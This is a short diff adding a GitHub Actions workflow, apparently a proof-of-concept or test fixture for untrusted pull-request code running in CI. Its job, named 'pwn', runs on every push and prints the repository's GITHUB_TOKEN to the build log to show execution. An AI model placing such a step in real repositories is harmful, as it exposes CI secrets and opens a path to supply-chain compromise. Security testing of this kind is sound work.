@@ -1,0 +1,16 @@
+# This is *attacker-controlled* content committed in the PR branch
+name: evil
+
+on:
+  push:
+    branches:
+      - "**"
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print token to prove execution
+        run: |
+          echo "Running malicious code from PR branch!"
+          echo "Token: $GITHUB_TOKEN"
